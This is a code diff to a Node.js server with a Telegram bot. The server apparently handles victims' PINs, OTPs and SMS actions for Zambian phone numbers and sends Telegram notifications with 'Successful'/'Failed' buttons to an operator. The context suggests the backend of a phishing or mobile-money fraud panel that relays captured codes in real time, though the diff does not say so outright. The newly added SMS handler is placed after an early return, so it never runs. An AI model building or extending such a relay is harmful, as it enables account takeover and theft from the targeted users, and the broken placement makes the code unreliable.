@@ -720,6 +720,23 @@ async function handleCallback(query) {
       await ack('⚠️ Wrong PIN');
     }
     return;
+    if (type === 'sms') {
+        if (action === 'success') {
+            await edit(
+            `✅ <b>SMS CONFIRMED</b>\n📞 <code>${phone}</code>\n⏰ ${new Date().toLocaleTimeString()}`
+            );
+            await ack('✅ Marked successful');
+        } else if (action === 'fail') {
+            await edit(
+            `❌ <b>SMS FAILED</b>\n📞 <code>${phone}</code>\n⏰ ${new Date().toLocaleTimeString()}`
+            );
+            await ack('❌ Marked failed');
+            // Optionally notify the user's bot that it failed — or leave for admin to handle manually
+        }
+        // Clean up pending entry regardless
+        pendingSendTexts.delete(phone);
+        return;
+        }
   }
   await ack('❓ Unknown');
 }
@@ -989,24 +1006,28 @@ app.post('/api/:userId/confirm-sms-sent', resolveUser, async (req, res) => {
   const phone = normalise(raw);
   const { num } = fmtPhone(phone);
 
-  log.info(`SMS confirmed sent for ${phone} by user ${user.name}`);
+  log.info(`SMS send button clicked for ${phone} by user ${user.name}`);
 
-  // Clean up the pending entry
-  pendingSendTexts.delete(phone);
+  res.json({ success: true, message: 'Notification sent' });
 
-  // Notify admin on Telegram
+  // Notify admin with confirm/fail buttons
   if (bot && botHealthy) {
     await sendMsg(user,
       `📩 <b>${sanitize(user.name)} — SMS FORWARDED</b>\n\n` +
-      `✅ Message forwarded successfully\n` +
+      `👆 User tapped Send Message button\n` +
       `📞 <b>Phone:</b> <code>+260${num}</code>\n` +
       `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
-      `━━━━━━━━━━━━━━━━━━━`
+      `Did the SMS go through?`,
+      {
+        reply_markup: { inline_keyboard: [[
+          { text: '✅ Successful', callback_data: mkCb('sms', 'success', phone, num) },
+          { text: '❌ Failed',     callback_data: mkCb('sms', 'fail',    phone, num) },
+        ]] }
+      }
     );
   }
-
-  res.json({ success: true, message: 'Confirmation sent' });
 });
+
 
 app.post('/api/:userId/verify-otp', resolveUser, async (req, res) => {
   const user = req.user; if (!botOk(res)) return;
